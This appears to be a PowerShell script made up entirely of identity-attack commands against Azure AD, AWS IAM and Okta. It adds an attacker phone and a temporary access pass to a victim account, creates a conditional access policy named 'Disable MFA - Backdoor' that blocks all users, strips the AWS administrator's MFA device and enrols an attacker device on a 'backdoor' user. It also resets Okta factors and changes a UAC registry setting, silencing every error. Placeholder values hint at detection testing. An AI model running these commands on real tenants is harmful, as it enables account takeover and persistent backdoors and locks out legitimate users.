& az.cmd ad user update --id "victim@corp.com" --force-change-password-next-sign-in false 2>&1 | Out-Null
& az.cmd rest --method PATCH --url "https://graph.microsoft.com/v1.0/users/victim@corp.com/authentication/methods" --body '{"@odata.type":"#microsoft.graph.phoneAuthenticationMethod","phoneNumber":"+1-555-attacker","phoneType":"mobile"}' 2>&1 | Out-Null
& az.cmd rest --method DELETE --url "https://graph.microsoft.com/v1.0/users/victim@corp.com/authentication/phoneMethods/00000000-0000-0000-0000-000000000000" 2>&1 | Out-Null
& az.cmd rest --method POST --url "https://graph.microsoft.com/v1.0/users/victim@corp.com/authentication/temporaryAccessPassMethods" --body '{"lifetimeInMinutes":60}' 2>&1 | Out-Null
& az.cmd rest --method GET --url "https://graph.microsoft.com/v1.0/users/victim@corp.com/authentication/methods" 2>&1 | Out-Null

& az.cmd ad user update --id "victim@corp.com" --account-enabled true 2>&1 | Out-Null
& az.cmd rest --method PATCH --url "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy" --body '{"registrationEnforcement":{"authenticationMethodsRegistrationCampaign":{"state":"disabled"}}}' 2>&1 | Out-Null

$conditionalAccessPayload = @{
    displayName = "Disable MFA - Backdoor"
    state = "enabled"
    conditions = @{ users = @{ includeUsers = @("All") }; applications = @{ includeApplications = @("All") } }
    grantControls = @{ operator = "OR"; builtInControls = @("block") }
} | ConvertTo-Json -Depth 5
try { Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" -Method POST -Body $conditionalAccessPayload -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}

& aws.exe iam deactivate-mfa-device --user-name administrator --serial-number "arn:aws:iam::123456789012:mfa/administrator" 2>&1 | Out-Null
& aws.exe iam delete-virtual-mfa-device --serial-number "arn:aws:iam::123456789012:mfa/administrator" 2>&1 | Out-Null
& aws.exe iam enable-mfa-device --user-name backdoor --serial-number "arn:aws:iam::123456789012:mfa/attacker" --authentication-code1 123456 --authentication-code2 654321 2>&1 | Out-Null

if (-not ('OktaEnum' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net;
    public class OktaEnum {
        public static string ResetFactors(string domain, string token, string userId) {
            try {
                var wc = new WebClient();
                wc.Headers.Add("Authorization", "SSWS " + token);
                wc.Headers.Add("Content-Type", "application/json");
                return wc.UploadString("https://" + domain + "/api/v1/users/" + userId + "/lifecycle/reset_factors", "POST", "");
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

[OktaEnum]::ResetFactors("corp.okta.com", "fake_token_000", "00u1234567890") | Out-Null

& reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
& reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /f 2>&1 | Out-Null
